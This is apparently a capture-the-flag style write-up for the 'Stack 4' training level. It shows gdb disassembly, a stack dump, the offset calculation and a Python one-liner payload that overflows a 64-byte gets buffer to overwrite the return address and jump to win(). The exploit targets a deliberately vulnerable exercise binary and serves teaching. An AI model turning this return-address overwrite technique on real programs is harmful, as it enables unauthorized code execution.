# Stack 4
## Overview
    1. We need to redirect the execution flow to execute the uncalled 
       function win().
    2. The esp(current stack pointer) grows upward when allocating memory 
       and the higher the esp goes, it points to smaller address number.
       Thus, we must first overwrite the buffer[64] and then overwrite the
       return address to the address of win function.
    3. The buffer[64] gets its value through standard I/O.
    
## Process
    $ gdb -q ./stack4
    (gdb) disas main
        Dump of assembler code for function main:
            0x08048408 <+0>:     push   %ebp
            0x08048409 <+1>:     mov    %esp,%ebp
            0x0804840b <+3>:     and    $0xfffffff0,%esp
            0x0804840e <+6>:     sub    $0x50,%esp
            0x08048411 <+9>:     lea    0x10(%esp),%eax
            0x08048415 <+13>:    mov    %eax,(%esp)
            0x08048418 <+16>:    call   0x804830c <gets@plt>
            0x0804841d <+21>:    leave
            0x0804841e <+22>:    ret
        End of assembler dump.
    (gdb) disas win
        Dump of assembler code for function win:
            0x080483f4 <+0>:     push   %ebp
            0x080483f5 <+1>:     mov    %esp,%ebp
            0x080483f7 <+3>:     sub    $0x18,%esp
            0x080483fa <+6>:     movl   $0x80484e0,(%esp)
            0x08048401 <+13>:    call   0x804832c <puts@plt>
            0x08048406 <+18>:    leave
            0x08048407 <+19>:    ret
        End of assembler dump.
    (gdb) b *main+21
        Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
    (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        Breakpoint 1, main (argc=1, argv=0xffffd634) at stack4/stack4.c:16
        16      stack4/stack4.c: No such file or directory.
    (gdb) x/60x $esp
        0xffffd540: 0xffffd550  0x0000002f  0xf7e12dc8  0xf7fd5858
        0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd570: 0x41414141  0x41414141  0x41414141  0x00414141
        0xffffd580: 0xf7fb83dc  0x080481e8  0x0804843b  0x00000000
        0xffffd590: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
        0xffffd5a0: 0x00000001  0xffffd634  0xffffd63c  0x00000000
        0xffffd5b0: 0x00000000  0x00000000  0xf7fb8000  0xf7ffdc04
        0xffffd5c0: 0xf7ffd000  0x00000000  0xf7fb8000  0xf7fb8000
        0xffffd5d0: 0x00000000  0x0e02ad85  0x32620395  0x00000000
        0xffffd5e0: 0x00000000  0x00000000  0x00000001  0x08048340
        0xffffd5f0: 0x00000000  0xf7fedf10  0xf7fe8780  0xf7ffd000
        0xffffd600: 0x00000001  0x08048340  0x00000000  0x08048361
        0xffffd610: 0x08048408  0x00000001  0xffffd634  0x08048430
        0xffffd620: 0x08048420  0xf7fe8780  0xffffd62c  0xf7ffd918
    (gdb) x/x $ebp+4
        0xffffd59c:     0xf7e1e637
        
## Method
    address of win function: 0x080483f4
    buffer[64]: start from first stack of line 0xffffd550.
    return address ($ebp+4): last stack of line 0xffffd590. (0xf7e1e637)
    
    -> We need to use 76 As to overwrite the data from the start of 
    buffer[64] to the start of return address, and then use the little 
    endian of 0x080483f4 (\xf4\x83\x04\x08) to overwrite the value of 
    return address.
    
## Answer
    $ python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./stack4
    code flow successfully changed
    Segmentation fault (core dumped)
